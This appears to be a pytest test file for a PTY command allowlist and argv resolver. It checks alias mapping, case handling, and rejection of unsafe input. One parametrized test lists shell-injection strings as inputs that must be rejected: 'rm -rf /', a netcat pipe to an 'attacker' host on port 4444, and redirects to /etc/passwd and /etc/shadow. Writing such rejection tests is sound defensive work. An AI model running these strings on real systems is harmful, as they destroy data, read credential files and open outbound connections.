"""Tests for hub/pty_commands.py — the M5 allowlist + argv resolver."""

from __future__ import annotations

import pytest

from hub.pty_commands import (
    COMMAND_ALIASES,
    COMMAND_ARGVS,
    PtyCommand,
    UnknownPtyCommand,
    allowed_aliases,
    resolve_command,
)


class TestResolveCommand:
    def test_empty_and_bash_default_to_shell(self) -> None:
        assert resolve_command("") == COMMAND_ARGVS[PtyCommand.SHELL]
        assert resolve_command("bash") == COMMAND_ARGVS[PtyCommand.SHELL]
        assert resolve_command("shell") == COMMAND_ARGVS[PtyCommand.SHELL]

    def test_sh_maps_to_login_shell(self) -> None:
        assert resolve_command("sh") == ["sh", "-l"]

    def test_claude_maps_to_claude_exec(self) -> None:
        assert resolve_command("claude") == ["sh", "-c", "exec claude"]

    def test_python_aliases(self) -> None:
        assert resolve_command("python") == COMMAND_ARGVS[PtyCommand.PYTHON]
        assert resolve_command("python3") == COMMAND_ARGVS[PtyCommand.PYTHON]
        assert resolve_command("py") == COMMAND_ARGVS[PtyCommand.PYTHON]

    def test_case_insensitive_and_whitespace(self) -> None:
        assert resolve_command("  Bash  ") == COMMAND_ARGVS[PtyCommand.SHELL]
        assert resolve_command("CLAUDE") == COMMAND_ARGVS[PtyCommand.CLAUDE]

    def test_returned_argv_is_a_copy(self) -> None:
        """Mutating a resolved argv must not leak back into the registry."""
        result = resolve_command("bash")
        result.append("--rm-rf")
        assert "--rm-rf" not in COMMAND_ARGVS[PtyCommand.SHELL]


class TestRejectsShellInjection:
    @pytest.mark.parametrize(
        "raw",
        [
            ";rm -rf /",
            "bash; rm -rf /",
            "bash && echo pwned",
            "$(whoami)",
            "`id`",
            "|nc attacker 4444",
            "> /etc/passwd",
            "< /etc/shadow",
            "echo $HOME",
            "cmd1; cmd2",
            "echo hello > file",
            "bash\\n -c evil",
        ],
    )
    def test_metachar_values_are_rejected(self, raw: str) -> None:
        with pytest.raises(UnknownPtyCommand) as exc:
            resolve_command(raw)
        assert exc.value.raw == raw

    @pytest.mark.parametrize(
        "raw",
        [
            "unknown_binary",
            "bashh",  # near-miss of an alias
            "/bin/bash",  # absolute paths are not on the allowlist
            "bash -c evil",  # spaces aren't a metachar but also aren't in aliases
        ],
    )
    def test_unknown_values_are_rejected(self, raw: str) -> None:
        with pytest.raises(UnknownPtyCommand):
            resolve_command(raw)


class TestAllowedAliases:
    def test_contains_known_names(self) -> None:
        aliases = allowed_aliases()
        for expected in ("bash", "sh", "claude", "python", "node"):
            assert expected in aliases

    def test_sorted(self) -> None:
        aliases = allowed_aliases()
        assert aliases == sorted(aliases)


class TestEnumCompleteness:
    def test_every_pty_command_has_an_argv(self) -> None:
        """New PtyCommand members must ship with a matching argv entry."""
        for member in PtyCommand:
            assert member in COMMAND_ARGVS, f"missing argv for {member}"

    def test_every_alias_points_to_a_known_command(self) -> None:
        for raw, command in COMMAND_ALIASES.items():
            assert command in COMMAND_ARGVS, f"alias {raw!r} points at unknown {command!r}"
